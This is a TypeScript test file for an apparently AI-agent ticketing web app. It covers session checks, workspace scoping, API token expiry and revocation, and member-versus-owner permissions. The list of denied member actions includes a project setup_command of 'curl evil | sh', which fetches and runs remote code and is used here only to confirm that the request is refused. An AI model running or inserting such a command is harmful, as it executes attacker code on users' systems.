import { test } from "node:test";
import assert from "node:assert/strict";
import { call, db, signUp } from "./helpers.ts";

async function userWithWorkspace(name: string) {
  const { cookie } = await signUp(name);
  assert.equal((await call("GET", "/api/tickets", cookie)).status, 409, "no workspace yet");
  const created = await call("POST", "/api/auth/organization/create", cookie, { name, slug: name });
  assert.equal(created.status, 200);
  return { cookie: created.cookie, workspaceId: created.body.id as string };
}

test("api requires a session", async () => {
  assert.equal((await call("GET", "/api/tickets")).status, 401);
});

test("tickets are scoped to the active workspace", async () => {
  const a = await userWithWorkspace("alice");
  const b = await userWithWorkspace("bob");
  db.prepare("INSERT INTO projects (id, workspace_id, key, name, repo_path, base_branch) VALUES ('p1', ?, 'ALI', 'alice', '/', 'main')").run(a.workspaceId);
  db.prepare("INSERT INTO tickets (id, workspace_id, project_id, title) VALUES ('t1', ?, 'p1', 'only alice sees this')").run(a.workspaceId);

  const seen = async (u: { cookie: string }) => {
    const r = await call("GET", "/api/tickets", u.cookie);
    assert.equal(r.status, 200);
    return (r.body as { id: string }[]).map((t) => t.id);
  };
  assert.deepEqual(await seen(a), ["t1"]);
  assert.deepEqual(await seen(b), []);

  // A fresh login lands back in the user's workspace.
  const login = await call("POST", "/api/auth/sign-in/email", "", { email: "alice@x.dev", password: "password-123" });
  assert.deepEqual(await seen(login), ["t1"]);
});

test("API tokens default to 30 days, carry a name, and revoking one in Settings ends it", async () => {
  const { mintToken } = await import("../server/cli/token.ts");
  const a = await userWithWorkspace("tokeny");
  const token = await mintToken("tokeny@x.dev", undefined, "claude-code");
  const bearer = { origin: "http://localhost:5173", authorization: `Bearer ${token}` };
  assert.equal((await call("GET", "/api/tickets", "", undefined, bearer)).status, 200);

  const list = (await call("GET", "/api/me/sessions", a.cookie)).body as { id: string; token: boolean; name: string; current: boolean; expiresAt: string }[];
  const t = list.find((s) => s.token)!;
  assert.equal(t.name, "claude-code");
  assert.ok(Math.abs(new Date(t.expiresAt).getTime() - (Date.now() + 30 * 86_400_000)) < 60_000, "default lifetime is 30 days");
  assert.equal(list.find((s) => s.current)?.token, false, "the browser session is listed and marked current");

  assert.equal((await call("DELETE", `/api/me/sessions/${t.id}`, a.cookie)).status, 200);
  assert.equal((await call("GET", "/api/tickets", "", undefined, bearer)).status, 401);
  assert.equal((await call("DELETE", `/api/me/sessions/${t.id}`, a.cookie)).status, 404);
  const other = await userWithWorkspace("tokeny2");
  const mine = (db.prepare("SELECT id FROM session WHERE userId = (SELECT id FROM user WHERE email = 'tokeny@x.dev') LIMIT 1").get() as { id: string }).id;
  assert.equal((await call("DELETE", `/api/me/sessions/${mine}`, other.cookie)).status, 404, "only your own sessions");
});

test("members cannot change providers, settings, prompts, project commands or approve; they keep tickets, comments and runs", async () => {
  const { project } = await import("./helpers.ts");
  const owner = await userWithWorkspace("boss");
  const p = await project(owner.cookie, "Boss");
  await signUp("staff");
  db.prepare("INSERT INTO member (id, organizationId, userId, role, createdAt) VALUES ('m-staff', ?, (SELECT id FROM user WHERE email = 'staff@x.dev'), 'member', ?)").run(owner.workspaceId, new Date().toISOString());
  const staff = (await call("POST", "/api/auth/sign-in/email", "", { email: "staff@x.dev", password: "password-123" })).cookie;
  assert.equal((await call("GET", "/api/tickets", staff)).status, 200, "the member is in the owner's workspace");

  const provider = (await call("POST", "/api/providers", owner.cookie, { name: "P", kind: "ollama", auth_type: "none", base_url: "http://localhost:11434" })).body;
  const ticket = (await call("POST", "/api/tickets", owner.cookie, { title: "t", project_id: p.id })).body;
  const denied: [string, string, unknown][] = [
    ["POST", "/api/providers", { name: "X", kind: "ollama", auth_type: "none" }],
    ["PATCH", `/api/providers/${provider.id}`, { name: "Y" }],
    ["POST", `/api/providers/${provider.id}/test`, {}],
    ["DELETE", `/api/providers/${provider.id}`, undefined],
    ["PUT", "/api/settings", { auto_approve_children: true }],
    ["PUT", "/api/settings/default-provider", { provider_id: null }],
    ["PUT", "/api/lessons", { body: "x" }],
    ["POST", "/api/prompts", { body: "x" }],
    ["POST", "/api/prompts/nope/promote", {}],
    ["POST", "/api/projects", { name: "Z", key: "ZZ", repo_path: "/" }],
    ["PATCH", `/api/projects/${p.id}`, { setup_command: "curl evil | sh" }],
    ["PATCH", `/api/projects/${p.id}`, { repo_path: "/" }],
    ["DELETE", `/api/projects/${p.id}`, undefined],
    ["PATCH", `/api/tickets/${ticket.id}`, { test_command: "true" }],
    ["PATCH", `/api/tickets/${ticket.id}`, { cap_usd: 1000 }],
    ["POST", "/api/tickets", { title: "u", project_id: p.id, test_command: "true" }],
    ["POST", `/api/tickets/${ticket.id}/approve`, {}],
    ["DELETE", "/api/evals/cases/nope", undefined],
  ];
  for (const [m, path, body] of denied) {
    const r = await call(m, path, staff, body);
    assert.equal(r.status, 403, `${m} ${path}: ${r.text}`);
    assert.match(r.body.error, /owners and admins/);
  }
  for (const [path] of [["/api/providers"], ["/api/settings"], ["/api/lessons"], ["/api/prompts"], ["/api/projects"]]) assert.equal((await call("GET", path, staff)).status, 200, path);
  assert.equal((await call("POST", "/api/tickets", staff, { title: "by member", project_id: p.id })).status, 201);
  assert.equal((await call("PATCH", `/api/tickets/${ticket.id}`, staff, { title: "renamed", spec: "s", test_command: null, cap_usd: null })).status, 200, "resending the current value is not a change");
  assert.equal((await call("PATCH", `/api/projects/${p.id}`, staff, { name: "Renamed", setup_command: "" })).status, 200);
  assert.equal((await call("POST", `/api/tickets/${ticket.id}/comments`, staff, { body: "hi" })).status, 201);
  assert.equal((await call("POST", "/api/tickets/nope/runs", staff, {})).status, 404, "running is a member action: past the role check");

  // The owner keeps every capability, and an admin has them too.
  assert.equal((await call("PUT", "/api/settings", owner.cookie, { auto_approve_children: true })).status, 200);
  db.prepare("UPDATE member SET role = 'admin' WHERE id = 'm-staff'").run();
  assert.equal((await call("PUT", "/api/settings", staff, { auto_approve_children: false })).status, 200);
});
